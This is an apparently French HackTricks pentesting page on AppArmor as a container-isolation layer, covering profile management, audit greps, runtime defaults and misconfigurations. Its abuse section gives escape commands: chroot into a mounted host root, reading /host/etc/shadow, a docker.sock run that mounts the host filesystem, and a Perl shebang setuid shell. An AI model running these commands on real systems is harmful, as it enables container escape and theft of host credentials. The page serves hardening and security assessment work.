# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Rôle dans l'isolation des conteneurs

AppArmor est un système de **Mandatory Access Control** qui applique des restrictions au moyen de profils propres à chaque programme. Contrairement aux vérifications DAC traditionnelles, qui dépendent fortement de la propriété des utilisateurs et des groupes, AppArmor permet au kernel d'appliquer une policy attachée au processus lui-même. Dans les environnements de conteneurs, cela est important, car une workload peut disposer de suffisamment de privilèges traditionnels pour tenter une action et être malgré tout refusée, car son profil AppArmor n'autorise pas le path, le mount, le comportement réseau ou l'utilisation de la capability concernés.

Le point conceptuel le plus important est qu'AppArmor est **basé sur les chemins**. Il évalue l'accès au filesystem au moyen de règles de chemins, plutôt qu'avec des labels comme le fait SELinux. Cela le rend accessible et puissant, mais signifie également que les bind mounts et les layouts de chemins alternatifs nécessitent une attention particulière. Si le même contenu de l'hôte devient accessible sous un chemin différent, l'effet de la policy peut ne pas être celui initialement prévu par l'opérateur.

## Rôle dans l'isolation des conteneurs

Les security reviews de conteneurs s'arrêtent souvent aux capabilities et à seccomp, mais AppArmor reste important après ces vérifications. Imaginez un conteneur disposant de plus de privilèges qu'il ne devrait, ou une workload nécessitant une capability supplémentaire pour des raisons opérationnelles. AppArmor peut toujours limiter l'accès aux fichiers, le comportement des mounts, le networking et les patterns d'exécution de manière à bloquer le chemin d'abus évident. C'est pourquoi désactiver AppArmor « juste pour faire fonctionner l'application » peut discrètement transformer une configuration simplement risquée en une configuration activement exploitable.

## Lab

Pour vérifier si AppArmor est actif sur l'hôte, utilisez :
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Pour voir sous quel contexte le processus actuel du conteneur s’exécute :
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La différence est instructive. Dans le cas normal, le processus doit afficher un contexte AppArmor associé au profil choisi par le runtime. Dans le cas unconfined, cette couche de restriction supplémentaire disparaît.

Vous pouvez également vérifier ce que Docker pense avoir appliqué :
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Utilisation à l'exécution

Docker peut appliquer un profil AppArmor par défaut ou personnalisé lorsque l'hôte le prend en charge. Podman peut également s'intégrer à AppArmor sur les systèmes basés sur AppArmor, bien que sur les distributions où SELinux est prioritaire, l'autre système MAC soit souvent au premier plan. Kubernetes peut exposer une policy AppArmor au niveau du workload sur les nodes qui prennent effectivement en charge AppArmor. LXC et les environnements associés de system-containers de la famille Ubuntu utilisent également largement AppArmor.

L'idée pratique est qu'AppArmor n'est pas une « fonctionnalité Docker ». Il s'agit d'une fonctionnalité du kernel de l'hôte que plusieurs runtimes peuvent choisir d'appliquer. Si l'hôte ne la prend pas en charge ou si le runtime est configuré pour s'exécuter en mode unconfined, la protection supposée n'est pas réellement présente.

Pour Kubernetes, l'API moderne est `securityContext.appArmorProfile`. Depuis Kubernetes `v1.30`, les anciennes annotations AppArmor beta sont deprecated. Sur les hôtes pris en charge, `RuntimeDefault` est le profil par défaut, tandis que `Localhost` pointe vers un profil qui doit déjà être chargé sur le node. Cela est important lors d'une review, car un manifest peut sembler prendre AppArmor en charge tout en dépendant entièrement du support côté node et de profils préchargés.

Un détail opérationnel subtil mais utile est que définir explicitement `appArmorProfile.type: RuntimeDefault` est plus strict que simplement omettre le champ. Si le champ est explicitement défini et que le node ne prend pas AppArmor en charge, l'admission devrait échouer. Si le champ est omis, le workload peut tout de même s'exécuter sur un node sans AppArmor et ne simplement pas recevoir cette couche supplémentaire de confinement. Du point de vue d'un attacker, c'est une bonne raison de vérifier à la fois le manifest et l'état réel du node.

Sur les hôtes Docker prenant en charge AppArmor, le profil par défaut le plus connu est `docker-default`. Ce profil est généré à partir du template AppArmor de Moby et il est important, car il explique pourquoi certains PoCs basés sur les capabilities échouent malgré tout dans un container par défaut. Dans les grandes lignes, `docker-default` autorise le networking ordinaire, refuse les écritures vers une grande partie de `/proc`, refuse l'accès aux parties sensibles de `/sys`, bloque les opérations de mount et restreint ptrace afin qu'il ne constitue pas une primitive générale de probing de l'hôte. Comprendre cette baseline aide à faire la distinction entre « le container possède `CAP_SYS_ADMIN` » et « le container peut réellement utiliser cette capability contre les interfaces du kernel qui m'intéressent ».

## Gestion des profils

Les profils AppArmor sont généralement stockés sous `/etc/apparmor.d/`. Une convention de nommage courante consiste à remplacer les slashes du chemin de l'exécutable par des points. Par exemple, un profil pour `/usr/bin/man` est généralement stocké sous `/etc/apparmor.d/usr.bin.man`. Ce détail est important à la fois pour la défense et pour l'assessment, car une fois que vous connaissez le nom du profil actif, vous pouvez souvent localiser rapidement le fichier correspondant sur l'hôte.

Les commandes de gestion utiles côté hôte incluent :
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La raison pour laquelle ces commandes sont importantes dans une référence sur la container-security est qu’elles expliquent comment les profils sont réellement créés, chargés, basculés en complain mode et modifiés après des changements dans l’application. Si un opérateur a l’habitude de basculer les profils en complain mode pendant le troubleshooting et oublie de rétablir l’enforcement, le container peut sembler protégé dans la documentation tout en se comportant de manière beaucoup plus permissive en réalité.

### Création et mise à jour des profils

`aa-genprof` peut observer le comportement d’une application et aider à générer un profil de manière interactive :
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` peut générer un profil modèle qui pourra ensuite être chargé avec `apparmor_parser` :
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Lorsque le binaire est modifié et que la policy doit être mise à jour, `aa-logprof` peut rejouer les refus trouvés dans les logs et aider l’opérateur à décider de les autoriser ou de les refuser :
```bash
sudo aa-logprof
```
### Logs

Les refus AppArmor sont souvent visibles via `auditd`, syslog ou des outils tels que `aa-notify` :
```bash
sudo aa-notify -s 1 -v
```
C'est utile sur le plan opérationnel et offensif. Les defenders l'utilisent pour affiner les profiles. Les attackers l'utilisent pour déterminer quel chemin ou quelle opération précise est refusé(e), et si AppArmor est le contrôle qui bloque une exploit chain.

### Identifier Le Fichier De Profile Exact

Lorsqu'un runtime affiche le nom d'un profile AppArmor spécifique pour un container, il est souvent utile de faire correspondre ce nom au fichier de profile présent sur le disque :
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
C'est particulièrement utile lors d'une revue côté hôte, car cela comble l'écart entre « le container indique qu'il s'exécute sous le profil `lowpriv` » et « les règles réelles se trouvent dans ce fichier spécifique, qui peut être audité ou rechargé ».

### Règles à haut signal à auditer

Lorsque vous pouvez lire un profil, ne vous arrêtez pas aux simples lignes `deny`. Plusieurs types de règles modifient considérablement l'efficacité d'AppArmor contre une tentative d'escape de container :

- `ux` / `Ux` : exécute le binaire cible sans confinement. Si un helper, un shell ou un interpréteur accessible est autorisé via `ux`, c'est généralement la première chose à tester.
- `px` / `Px` et `cx` / `Cx` : effectuent des transitions de profil lors d'un exec. Elles ne sont pas automatiquement dangereuses, mais méritent d'être auditées, car une transition peut mener à un profil beaucoup plus permissif que le profil actuel.
- `change_profile` : permet à une tâche de basculer vers un autre profil chargé, immédiatement ou lors du prochain exec. Si le profil de destination est moins restrictif, cela peut devenir l'escape hatch prévu pour sortir d'un domaine restrictif.
- `flags=(complain)`, `flags=(unconfined)` ou les plus récents `flags=(prompt)` : ces options doivent modifier le niveau de confiance que vous accordez au profil. `complain` journalise les refus au lieu de les appliquer, `unconfined` supprime la limite, et `prompt` dépend d'un chemin de décision en userspace plutôt que d'un refus imposé uniquement par le kernel.
- `userns` ou `userns create,` : les politiques AppArmor récentes peuvent contrôler la création de user namespaces. Si un profil de container l'autorise explicitement, les user namespaces imbriqués restent possibles, même lorsque la plateforme utilise AppArmor dans le cadre de sa stratégie de hardening.

Commande grep utile côté hôte :
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Ce type d’audit est souvent plus utile que d’examiner des centaines de règles de fichiers ordinaires. Si un breakout dépend de l’exécution d’un helper, de l’entrée dans un nouveau namespace ou de l’évasion vers un profile moins restrictif, la réponse est souvent cachée dans ces règles orientées vers les transitions plutôt que dans les lignes évidentes de type `deny /etc/shadow r`.

## Misconfigurations

L’erreur la plus évidente est `apparmor=unconfined`. Les administrateurs le définissent souvent lors du debugging d’une application qui a échoué parce que le profile bloquait correctement quelque chose de dangereux ou d’inattendu. Si ce flag reste actif en production, toute la couche MAC a été supprimée en pratique.

Un autre problème plus subtil consiste à supposer que les bind mounts sont inoffensifs parce que les permissions des fichiers semblent normales. Comme AppArmor est basé sur les paths, l’exposition de paths de l’hôte sous d’autres emplacements de montage peut interagir de manière problématique avec les règles de paths. Une troisième erreur consiste à oublier qu’un nom de profile dans un fichier de configuration ne signifie pas grand-chose si le kernel de l’hôte n’applique pas réellement AppArmor.

## Abuse

Lorsque AppArmor n’est plus actif, des opérations auparavant limitées peuvent soudainement fonctionner : la lecture de paths sensibles via des bind mounts, l’accès à certaines parties de procfs ou de sysfs qui auraient dû être plus difficiles à utiliser, l’exécution d’actions liées aux mounts si les capabilities/seccomp l’autorisent également, ou l’utilisation de paths qu’un profile aurait normalement refusés. AppArmor est souvent le mécanisme qui explique pourquoi une tentative de breakout basée sur les capabilities « devrait fonctionner » sur le papier, mais échoue tout de même en pratique. Supprimez AppArmor, et la même tentative peut commencer à réussir.

Si vous soupçonnez qu’AppArmor est le principal élément qui bloque une chaîne d’abuse basée sur le path-traversal, les bind mounts ou les mounts, la première étape consiste généralement à comparer ce qui devient accessible avec et sans profile. Par exemple, si un path de l’hôte est monté dans le container, commencez par vérifier si vous pouvez le parcourir et le lire :
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Si le container possède également une capability dangereuse telle que `CAP_SYS_ADMIN`, l’un des tests les plus pratiques consiste à vérifier si AppArmor est le contrôle qui bloque les opérations de montage ou l’accès aux systèmes de fichiers sensibles du kernel :
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Dans les environnements où un chemin de l’hôte est déjà disponible via un bind mount, la perte d’AppArmor peut également transformer un problème de divulgation d’informations en lecture seule en un accès direct aux fichiers de l’hôte :
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Le but de ces commandes n’est pas qu’AppArmor crée à lui seul le breakout. C’est qu’une fois AppArmor supprimé, de nombreuses voies d’abus basées sur le système de fichiers et les mounts deviennent immédiatement testables.

### Exemple complet : AppArmor désactivé + root de l’hôte monté

Si le conteneur possède déjà le root de l’hôte monté via bind dans `/host`, la suppression d’AppArmor peut transformer une voie d’abus du système de fichiers bloquée en un escape complet vers l’hôte :
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Dès lors que le shell s’exécute via le système de fichiers de l’hôte, la charge de travail s’est effectivement échappée des limites du conteneur :
```bash
id
hostname
cat /etc/shadow | head
```
### Exemple complet : AppArmor désactivé + socket Runtime

Si la véritable barrière était AppArmor autour de l’état du Runtime, un socket monté peut suffire à réaliser une évasion complète :
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Le chemin exact dépend du point de montage, mais le résultat final est le même : AppArmor n’empêche plus l’accès à la runtime API, et la runtime API peut lancer un container compromettant l’hôte.

### Exemple complet : contournement par bind-mount basé sur le chemin

Parce qu’AppArmor est basé sur les chemins, protéger `/proc/**` ne protège pas automatiquement le même contenu procfs de l’hôte lorsqu’il est accessible via un chemin différent :
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
L’impact dépend de ce qui est exactement monté et de la question de savoir si le chemin alternatif contourne également d’autres contrôles, mais ce pattern est l’une des raisons les plus évidentes pour lesquelles AppArmor doit être évalué avec la disposition des montages plutôt qu’isolément.

### Exemple complet : Shebang Bypass

La policy AppArmor cible parfois un chemin d’interpréteur sans tenir pleinement compte de l’exécution de scripts via la gestion des shebangs. Un exemple historique impliquait l’utilisation d’un script dont la première ligne pointe vers un interpréteur confiné :
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ce type d’exemple est important pour rappeler que l’intention du profil et la sémantique réelle de l’exécution peuvent diverger. Lors de l’examen d’AppArmor dans des environnements de conteneurs, les chaînes d’interpréteurs et les chemins d’exécution alternatifs méritent une attention particulière.

## Vérifications

L’objectif de ces vérifications est de répondre rapidement à trois questions : AppArmor est-il activé sur l’hôte, le processus actuel est-il confiné, et le runtime a-t-il réellement appliqué un profil à ce conteneur ?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Ce qui est intéressant ici :

- Si `/proc/self/attr/current` affiche `unconfined`, le workload ne bénéficie pas du confinement AppArmor.
- Si `aa-status` indique qu’AppArmor est désactivé ou non chargé, tout nom de profile présent dans la configuration du runtime est essentiellement cosmétique.
- Si `docker inspect` affiche `unconfined` ou un profile custom inattendu, c’est souvent la raison pour laquelle une voie d’abus basée sur le filesystem ou les mounts fonctionne.
- Si `/sys/kernel/security/apparmor/profiles` ne contient pas le profile attendu, la configuration du runtime ou de l’orchestrator ne suffit pas à elle seule.
- Si un profile supposé être hardenisé contient des règles de type `ux`, `change_profile` trop larges, `userns` ou `flags=(complain)`, la boundary pratique peut être bien plus faible que ne le suggère le nom du profile.

Si un container dispose déjà de privilèges élevés pour des raisons opérationnelles, laisser AppArmor activé fait souvent la différence entre une exception contrôlée et une faille de sécurité beaucoup plus large.

## Defaults du runtime

| Runtime / platform | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut sur les hosts compatibles avec AppArmor | Utilise le profile AppArmor `docker-default` sauf s’il est remplacé | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dépend du host | AppArmor est supporté via `--security-opt`, mais le comportement exact par défaut dépend du host/runtime et est moins universel que le profile `docker-default` documenté par Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Default conditionnel | Si `appArmorProfile.type` n’est pas spécifié, le default est `RuntimeDefault`, mais il n’est appliqué que lorsque AppArmor est activé sur le node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` avec un profile faible, nodes sans support AppArmor |
| containerd / CRI-O sous Kubernetes | Suit le support du node/runtime | Les runtimes couramment supportés par Kubernetes prennent en charge AppArmor, mais l’enforcement réel dépend toujours du support du node et des paramètres du workload | Identique à la ligne Kubernetes ; la configuration directe du runtime peut également ignorer complètement AppArmor |

Pour AppArmor, la variable la plus importante est souvent le **host**, et pas uniquement le runtime. Un paramètre de profile dans un manifest ne crée pas de confinement sur un node où AppArmor n’est pas activé.

## Références

- [Security context Kubernetes : champs du profile AppArmor et comportement lié au support du node](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Page de manuel `apparmor.d(5)` d’Ubuntu 24.04 : exec transitions, `change_profile`, `userns` et profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
